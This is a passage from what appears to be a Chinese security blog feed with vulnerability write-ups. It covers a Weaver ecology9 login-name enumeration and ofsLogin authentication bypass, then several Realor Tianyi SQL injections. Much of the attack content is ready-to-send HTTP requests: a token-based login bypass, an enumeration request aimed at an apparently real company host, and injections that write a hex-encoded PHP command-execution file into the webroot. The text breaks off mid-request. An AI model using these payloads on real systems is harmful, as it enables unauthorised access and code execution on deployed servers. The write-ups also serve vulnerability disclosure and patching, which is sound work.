class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri, 19 May 2023 01:43:50 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>34</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">X-XSS-Protection</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">X-UA-Compatible</span><span class="punctuation">: </span>IE=8</span><br><span class="line"><span class="attribute">Expires</span><span class="punctuation">: </span>Thu, 01 Dec 1994 16:00:00 GMT</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>ecology_JSessionid=aaxctkRR1WUJ97SAqRRiy; path=/</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;loginId&quot;</span><span class="punctuation">:</span><span class="string">&quot;xsijr&quot;</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">&#125;</span></span></span><br><span class="line"><span class="language-json"></span></span><br><span class="line"><span class="language-json"></span></span><br></pre></td></tr></table></figure><p>但不过，在上面我们登入系统后台新建一名人员，填写人员信息时，移动电话并不是必填项。<code>%</code>模糊匹配虽然好用，但是当表中的数据条目超过1条，并且它们的<code>mobile</code>字段都为空时，它便再无用武之地了。</p><p>所以，我们继续往上看代码，当<code>type</code>等于<code>status</code>时。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;weaver.login.LoginRemindService&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> Util.null2String(fu.getParameter(<span class="string">&quot;type&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;status&quot;</span>.equalsIgnoreCase(type))&#123;</span><br><span class="line"><span class="type">LoginRemindService</span> <span class="variable">loginRemind</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LoginRemindService</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">loginId</span> <span class="operator">=</span> Util.null2String(fu.getParameter(<span class="string">&quot;loginId&quot;</span>));</span><br><span class="line">org.json.<span class="type">JSONObject</span> <span class="variable">json</span> <span class="operator">=</span> loginRemind.getPassChangedReminder(loginId);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">weaver</span>.general.BaseBean().writeLog(<span class="string">&quot;resultA:&quot;</span>+json.toString());</span><br><span class="line"><span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> json.getString(<span class="string">&quot;resultMsg&quot;</span>);</span><br><span class="line">result.put(<span class="string">&quot;code&quot;</span>,code);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;22&quot;</span>.equalsIgnoreCase(code))&#123;</span><br><span class="line">result.put(<span class="string">&quot;days&quot;</span>,json.getInt(<span class="string">&quot;passwdelse&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">result.put(<span class="string">&quot;status&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br></pre></td></tr></table></figure><p>跟进<code>weaver.login.LoginRemindService</code>中的<code>getPassChangedReminder</code>方法，发现如果提供的<code>loginId</code>参数值在<code>HrmResourceManager</code>表中存在，则<code>code</code>的值会等于<code>&quot;21&quot;</code>，否则<code>code</code>等于<code>&quot;-1&quot;</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> JSONObject <span class="title function_">getPassChangedReminder</span><span class="params">(String var1)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="string">&quot;-1&quot;</span>;</span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">    <span class="type">RecordSet</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RecordSet</span>();</span><br><span class="line">    <span class="type">RecordSet</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RecordSet</span>();</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var4.executeQuery(<span class="string">&quot;select id from HrmResourceManager where loginId=? &quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;var1&#125;);</span><br><span class="line">        <span class="keyword">if</span> (!var4.next()) &#123;</span><br><span class="line">            <span class="type">RecordSet</span> <span class="variable">var8</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RecordSet</span>();</span><br><span class="line">            var8.executeQuery(<span class="string">&quot;select id,isadaccount from HrmResource where loginId=? &quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;var1&#125;);</span><br><span class="line">            <span class="keyword">if</span> (var8.next()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">var9</span> <span class="operator">=</span> var8.getString(<span class="string">&quot;isadaccount&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (!<span class="string">&quot;1&quot;</span>.equals(var9)) &#123;</span><br><span class="line">                    String var10;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">this</span>.isLoginMustUpPswd()) &#123;</span><br><span class="line">                        var10 = var8.getString(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">                        var5.executeQuery(<span class="string">&quot;SELECT COUNT(id) FROM HrmResource WHERE haschangepwd = &#x27;y&#x27; and id= ?&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;var10&#125;);</span><br><span class="line">                        <span class="keyword">if</span> (var5.next()) &#123;</span><br><span class="line">                            var6 = var5.getInt(<span class="number">1</span>) &lt;= <span class="number">0</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (!var6) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">this</span>.isPassChangeReminder()) &#123;</span><br><span class="line">                            var10 = <span class="built_in">this</span>.settings.getChangePasswordDays();</span><br><span class="line">                            <span class="type">String</span> <span class="variable">var11</span> <span class="operator">=</span> <span class="built_in">this</span>.settings.getDaysToRemind();</span><br><span class="line">                            <span class="type">String</span> <span class="variable">var12</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                            <span class="type">boolean</span> <span class="variable">var13</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">                            <span class="type">boolean</span> <span class="variable">var14</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">var15</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">var16</span> <span class="operator">=</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">var17</span> <span class="operator">=</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">                            var5.executeQuery(<span class="string">&quot;select passwdchgdate from hrmresource where loginId = ? &quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;var1&#125;);</span><br><span class="line">                            <span class="keyword">if</span> (var5.next()) &#123;</span><br><span class="line">                                var12 = var5.getString(<span class="number">1</span>);</span><br><span class="line">                                <span class="type">int</span> <span class="variable">var21</span> <span class="operator">=</span> TimeUtil.dateInterval(var12, TimeUtil.getCurrentDateString());</span><br><span class="line">                                <span class="keyword">if</span> (var21 &lt; Integer.parseInt(var10)) &#123;</span><br><span class="line">                                    var16 = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                var15 = TimeUtil.dateAdd(var12, Integer.parseInt(var10) - Integer.parseInt(var11));</span><br><span class="line">                                <span class="type">int</span> var22;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    var22 = TimeUtil.dateInterval(var15, TimeUtil.getCurrentDateString());</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (Exception var19) &#123;</span><br><span class="line">                                    var22 = <span class="number">0</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                var7 = Integer.parseInt(var11) - var22;</span><br><span class="line">                                <span class="keyword">if</span> (var22 &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                                    var17 = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span> (!<span class="string">&quot;1&quot;</span>.equals(var16)) &#123;</span><br><span class="line">                                var2 = <span class="string">&quot;20&quot;</span>;</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;1&quot;</span>.equals(var17)) &#123;</span><br><span class="line">                                var2 = <span class="string">&quot;22&quot;</span>;</span><br><span class="line">                                var3.put(<span class="string">&quot;passwdelse&quot;</span>, var7);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        var2 = <span class="string">&quot;21&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        var3.put(<span class="string">&quot;resultMsg&quot;</span>, var2);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var20) &#123;</span><br><span class="line">        <span class="built_in">this</span>.writeLog(<span class="string">&quot;getPassChangedReminder,Exception.&quot;</span> + var20.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> var3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么根据这个差异便可以用来爆破<code>loginId</code>，如下图。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/mobile/plugin/changeUserInfo.jsp?type=status&amp;loginId=user</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>weoa.sundan.com</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520143947132.png"></p><p>当<code>type</code>等于<code>getUserid</code>时，代码如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;weaver.mobile.plugin.ecology.service.HrmResourceService&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> Util.null2String(fu.getParameter(<span class="string">&quot;type&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;getUserid&quot;</span>.equalsIgnoreCase(type))&#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">loginId</span> <span class="operator">=</span> Util.null2String(fu.getParameter(<span class="string">&quot;loginId&quot;</span>));</span><br><span class="line"><span class="type">HrmResourceService</span> <span class="variable">hr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HrmResourceService</span>();</span><br><span class="line"><span class="type">int</span> <span class="variable">userid</span> <span class="operator">=</span> hr.getUserId(loginId);</span><br><span class="line">result.put(<span class="string">&quot;userid&quot;</span>,userid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">result.put(<span class="string">&quot;status&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br></pre></td></tr></table></figure><p>跟进<code>weaver.mobile.plugin.ecology.service.HrmResourceService</code>中的<code>getUserId</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getUserId</span><span class="params">(String var1)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        var2 = <span class="string">&quot;select id from HrmResource where loginid=&#x27;&quot;</span> + var1 + <span class="string">&quot;&#x27; and (accounttype is null  or accounttype=0) and status in (0,1,2,3)&quot;</span>;</span><br><span class="line">        var2 = var2 + <span class="string">&quot; union select id from HrmResourcemanager where loginid=&#x27;&quot;</span> + var1 + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        <span class="type">RecordSet</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RecordSet</span>();</span><br><span class="line">        var3.executeSql(var2);</span><br><span class="line">        <span class="keyword">if</span> (var3.next() &amp;&amp; Util.getIntValue(var3.getString(<span class="number">1</span>), <span class="number">0</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> Util.getIntValue(var3.getString(<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var4) &#123;</span><br><span class="line">        var4.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若提供的<code>loginId</code>参数值在<code>HrmResourceManager</code>表中存在，就会返回相应<code>id</code>字段的值，否则会返回<code>0</code>。</p><p>根据此差异，此处同样可以被用来爆破<code>loginId</code>。</p><p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520145322146.png"></p><p>在新建人员信息时，相比于移动电话，登录名的存在更为必需，也就是说在数据库表存在数据的情况下，每条数据它的<code>mobile</code>字段可能为空，但是<code>loginid</code>字段为空的概率更小。不过第一种利用模糊查询<code>mobile</code>的信息泄漏利用手法，比后两种爆破<code>loginId</code>更好利用，因为仅仅涉及到数字。</p><p>在实战过程中，这三种信息泄漏的利用手法，可能会因为系统版本的差异导致未预期的结果。例如就拿第一种信息泄漏的利用手法来说，在实际测试中，发现大量的站仅返回了<code>&#123;&quot;status&quot;:&quot;1&quot;&#125;</code>，但却不见<code>loginId</code>键值对。</p><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>在已知一个<code>loginId</code>值为<code>&quot;user1&quot;</code>的情况下，首先通过加密算法生成<code>loginTokenFromThird</code>的值。</p><p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520151651201.png"></p><p>然后作如下请求，便能成功进入系统后台<code>/wui/index.html</code>页面。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/mobile/plugin/1/ofsLogin.jsp?syscode=1&amp;timestamp=1&amp;gopage=/wui/index.html&amp;receiver=user1&amp;loginTokenFromThird=793527b3f4855296c85629a7271e20e7</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520151811489.png"></p><h2 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h2><p>目前厂商已发布了升级补丁以修复这个安全问题，请到厂商的补丁主页下载最新版本补丁包：<br><a href="https://www.weaver.com.cn/cs/securityDownload.html?src=cn">https://www.weaver.com.cn/cs/securityDownload.html?src=cn</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> sqli </tag>
            
            <tag> ecology </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>瑞友天翼应用虚拟化系统多个SQLi2RCE漏洞</title>
      <link href="/realor-tianyi-multiple-sqli2rce.html"/>
      <url>/realor-tianyi-multiple-sqli2rce.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#0x00-%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">0x00 漏洞简介</a></li><li><a href="#0x01-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC">0x01 影响版本</a></li><li><a href="#0x02-%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85">0x02 漏洞详情</a><ul><li><a href="#indexdologinname">&#x2F;Index&#x2F;dologin&#x2F;name</a></li><li><a href="#agentgetbsappurlappid">&#x2F;Agent&#x2F;GetBSAppUrl&#x2F;AppID</a></li><li><a href="#rapagentxgi">RAPAgent.XGI</a></li><li><a href="#consoleexternaluploadapixgi">ConsoleExternalUploadApi.XGI</a></li><li><a href="#consoleexternalapixgi">ConsoleExternalApi.XGI</a><ul><li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a></li><li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">漏洞利用</a></li></ul></li></ul></li></ul><h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p>瑞友天翼应用虚拟化系统是西安瑞友信息技术资讯有限公司研发的具有自主知识产权，基于服务器计算(Server-based Computing)架构的应用虚拟化平台。它将用户各种应用软件（ERP&#x2F;OA&#x2F;CRM等）集中部署在瑞友天翼服务器(群)上，客户端通过WEB即可快速安全的访问经服务器上授权的应用软件，实现集中应用、远程接入、协同办公等，从而为用户打造集中、便捷、安全、高效的虚拟化支撑平台。</p><p>瑞友天翼应用虚拟化系统存在多个SQL注入漏洞，攻击者可以通过SQL漏洞写入任意文件，进而达到执行任意代码。</p><h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><p>多个漏洞，以下前四个漏洞不影响目前最新7.0.3.1版本，最后一个漏洞影响7.0.3.1版本。</p><ul><li><p><code>/Index/dologin/name</code></p><ul><li>5.x &lt;&#x3D; version &lt; 7.0.3.1</li></ul></li><li><p><code>/Agent/GetBSAppUrl/AppID</code></p><ul><li>5.x &lt;&#x3D; version &lt; 7.0.3.1</li></ul></li><li><p><code>RAPAgent.XGI</code></p><ul><li>5.x &lt;&#x3D; version &lt; 7.0.3.1</li></ul></li><li><p><code>ConsoleExternalUploadApi.XGI</code></p><ul><li>5.x &lt;&#x3D; version &lt; 7.0.3.1</li></ul></li><li><p><code>ConsoleExternalApi.XGI</code></p><ul><li>5.x &lt;&#x3D; version &lt;&#x3D; 7.0.3.1</li></ul></li></ul><h2 id="0x02-漏洞详情"><a href="#0x02-漏洞详情" class="headerlink" title="0x02 漏洞详情"></a>0x02 漏洞详情</h2><h3 id="x2F-Index-x2F-dologin-x2F-name"><a href="#x2F-Index-x2F-dologin-x2F-name" class="headerlink" title="&#x2F;Index&#x2F;dologin&#x2F;name"></a>&#x2F;Index&#x2F;dologin&#x2F;name</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?s=/Index/dologin/name/demo%27)%3bselect%20unhex%28%273c3f70687020246f7574707574203d20617272617928293b657865632827646972272c20246f7574707574293b666f72656163682028246f757470757420617320246c696e6529207b6563686f20246c696e65202e205048505f454f4c3b7d202466696c65203d205f5f46494c455f5f3b20756e6c696e6b282466696c65293b%27%29%20into%20outfile%20%27%2e%5C%5C%2e%2e%5C%5C%2e%2e%5C%5CWebRoot%5C%5CBMyY3q.XGI%27%23/pwd/123123</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.21.89:8081</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/BMyY3q.XGI</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.21.89:8081</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="x2F-Agent-x2F-GetBSAppUrl-x2F-AppID"><a href="#x2F-Agent-x2F-GetBSAppUrl-x2F-AppID" class="headerlink" title="&#x2F;Agent&#x2F;GetBSAppUrl&#x2F;AppID"></a>&#x2F;Agent&#x2F;GetBSAppUrl&#x2F;AppID</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?s=/Agent/GetBSAppUrl/AppID/1&#x27;%20and%20(extractvalue(1,concat(0x7e,(select%20md5(1)),0x7e)))%20and%20&#x27;a&#x27;=&#x27;a</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.21.89:8081</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?s=/Agent/GetBSAppUrl/AppID/1&#x27;)%3bselect%20unhex%28%273c3f70687020246f7574707574203d20617272617928293b657865632827646972272c20246f7574707574293b666f72656163682028246f757470757420617320246c696e6529207b6563686f20246c696e65202e205048505f454f4c3b7d202466696c65203d205f5f46494c455f5f3b20756e6c696e6b282466696c65293b%27%29%20into%20outfile%20%27%2e%5C%5C%2e%2e%5C%5C%2e%2e%5C%5CWebRoot%5C%5CBMyY3q.XGI%27%23/pwd/123123</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.21.89:8081</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="RAPAgent-XGI"><a href="#RAPAgent-XGI" class="headerlink" title="RAPAgent.XGI"></a>RAPAgent.XGI</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/RAPAgent.XGI?CMD=getApplication&amp;AppID=APP00000001&amp;User=admin&amp;PWD=1&amp;AuthType=0&amp;Computer=1&#x27;%20union%20select%201%2c&#x27;asd213asd&#x27;%20into%20outfile%20&#x27;.%2f..%2f..%2fWebRoot%2fjs%2fasdxcfsea1.XGI&#x27;--%201&#x27;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.21.89:8081</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"></span><br><span 